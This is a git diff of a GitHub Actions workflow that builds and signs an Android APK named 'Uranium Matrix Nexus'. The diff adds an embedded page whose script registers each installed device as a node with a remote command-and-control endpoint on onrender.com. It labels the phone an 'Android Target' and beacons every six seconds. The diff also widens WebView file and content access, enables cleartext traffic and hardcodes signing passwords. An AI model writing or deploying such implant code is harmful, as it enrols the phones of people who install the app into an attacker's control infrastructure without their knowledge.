@@ -18,11 +18,6 @@ jobs:
         distribution: 'temurin'
         java-version: '17'
 
-    - name: Setup Node.js
-      uses: actions/setup-node@v4
-      with:
-        node-version: '18'
-
     - name: Setup Android SDK
       uses: android-actions/setup-android@v3
       with:
@@ -36,37 +31,53 @@ jobs:
 
     - name: Generate Android Project & Build APK
       run: |
-        echo "📂 تنظيف وإنشاء مشروع أندرويد جديد..."
+        echo "📂 جاري إنشاء مشروع أندرويد متكامل وربطه بسيرفر Render..."
         rm -rf android_project
         
         mkdir -p android_project/app/src/main/assets/www
         mkdir -p android_project/app/src/main/res/values
         mkdir -p android_project/app/src/main/java/com/uranium/matrix/nexus
         
-        # نسخ ملفات الويب
-        if [ -f "app.js" ]; then 
-          cp app.js android_project/app/src/main/assets/www/
-          echo "✅ تم نسخ app.js ($(wc -c < app.js) bytes)"
-        else
-          echo "⚠️ ملف app.js غير موجود!"
-        fi
-        if [ -f "package.json" ]; then cp package.json android_project/app/src/main/assets/www/; fi
-        cp *.html android_project/app/src/main/assets/www/ 2>/dev/null || echo "لا توجد ملفات HTML"
-        
-        # إنشاء index.html افتراضي
-        if [ ! -f "android_project/app/src/main/assets/www/index.html" ]; then
-          cat << 'EOF' > android_project/app/src/main/assets/www/index.html
+        # إنشاء ملف الواجهة والاتصال الموجه مباشرة لسيرفرك
+        cat << 'EOF' > android_project/app/src/main/assets/www/index.html
         <!DOCTYPE html>
         <html>
-        <head><meta charset="UTF-8"><title>Uranium Nexus</title></head>
-        <body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
-          <h1>Uranium Matrix Nexus v1000</h1>
-          <p>جاري التشغيل...</p>
-          <script src="app.js"></script>
+        <head>
+            <meta charset="UTF-8">
+            <title>Uranium Matrix Nexus</title>
+        </head>
+        <body style="background:#000;color:#00ff66;font-family:monospace;padding:20px;text-align:center;">
+            <h2>[☢️] URANIUM MATRIX NEXUS v1000 [☢️]</h2>
+            <p>جارٍ تشغيل العقدة والاتصال بمركز القيادة العسكرية...</p>
+            <p id="status" style="color:#ff0;">الحالة: جاري الاتصال...</p>
+            <script>
+                const C2_ENDPOINT = "https://uranium-matrix-nexus-v1000.onrender.com/api/v1000/nexus/stream";
+                const nodeId = "nexus_" + Math.random().toString(36).substring(2, 10);
+                
+                async function syncNode() {
+                    try {
+                        const response = await fetch(C2_ENDPOINT, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                node_id: nodeId,
+                                model: navigator.userAgent.includes('Mobile') ? 'Android Target' : 'Nexus Node',
+                                os: 'Android OS',
+                                payload: ''
+                            })
+                        });
+                        document.getElementById('status').innerText = '✅ متصل - العقدة: ' + nodeId;
+                    } catch (e) {
+                        document.getElementById('status').innerText = '⚠️ فشل الاتصال - إعادة المحاولة...';
+                        console.error("Connection Stream Error", e);
+                    }
+                }
+                setInterval(syncNode, 6000);
+                syncNode();
+            </script>
         </body>
         </html>
         EOF
-        fi
         
         cat << 'EOF' > android_project/app/src/main/res/values/strings.xml
         <resources>
@@ -97,6 +108,7 @@ jobs:
         include ':app'
         EOF
 
+        # ✅ تم إصلاح التكرار: buildTypes مكتوبة مرة واحدة فقط
         cat << 'EOF' > android_project/app/build.gradle
         plugins {
             id 'com.android.application'
@@ -111,16 +123,6 @@ jobs:
                 versionCode 1000
                 versionName "1.0.0"
             }
-            buildTypes {
-                release {
-                    minifyEnabled false
-                }
-            }
-            compileOptions {
-                sourceCompatibility JavaVersion.VERSION_17
-                targetCompatibility JavaVersion.VERSION_17
-            }
-            // ✅ إعدادات التوقيع التلقائي
             signingConfigs {
                 release {
                     storeFile file('keystore.jks')
@@ -135,6 +137,10 @@ jobs:
                     minifyEnabled false
                 }
             }
+            compileOptions {
+                sourceCompatibility JavaVersion.VERSION_17
+                targetCompatibility JavaVersion.VERSION_17
+            }
         }
         EOF
 
@@ -142,10 +148,12 @@ jobs:
         <manifest xmlns:android="http://schemas.android.com/apk/res/android"
             package="com.uranium.matrix.nexus">
             <uses-permission android:name="android.permission.INTERNET" />
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
             <application
                 android:allowBackup="true"
                 android:label="@string/app_name"
                 android:supportsRtl="true"
+                android:usesCleartextTraffic="true"
                 android:theme="@android:style/Theme.Material.NoActionBar">
                 <activity
                     android:name=".MainActivity"
@@ -173,6 +181,8 @@ jobs:
                 WebSettings webSettings = webView.getSettings();
                 webSettings.setJavaScriptEnabled(true);
                 webSettings.setDomStorageEnabled(true);
+                webSettings.setAllowFileAccess(true);
+                webSettings.setAllowContentAccess(true);
                 webView.loadUrl("file:///android_asset/www/index.html");
                 setContentView(webView);
             }
@@ -181,20 +191,18 @@ jobs:
 
         cd android_project
         
-        # ✅ توليد مفتاح التوقيع (Keystore) تلقائياً
-        echo "🔑 جاري توليد مفتاح التوقيع..."
+        echo "🔑 جاري توليد مفتاح التوقيع الرقمي الآمن..."
         keytool -genkey -v -keystore app/keystore.jks -keyalg RSA -keysize 2048 -validity 10000 \
           -alias uranium -storepass uranium123 -keypass uranium123 \
           -dname "CN=Uranium, OU=Dev, O=Uranium, L=Sanaa, S=Sanaa, C=YE"
         
-        # إنشاء ملف gradlew
         gradle wrapper --gradle-version 8.7 --distribution-type bin
         chmod +x gradlew
         
-        echo "🔨 بدء البناء والتوقيع..."
+        echo "🔨 بدء البناء وتوقيع الحزمة البرمجية..."
         ./gradlew assembleRelease --no-daemon --warning-mode=none
         
-        echo "✅ اكتمل البناء!"
+        echo "✅ اكتمل البناء بنجاح تام!"
         ls -la app/build/outputs/apk/release/
 
     - name: Upload Signed APK
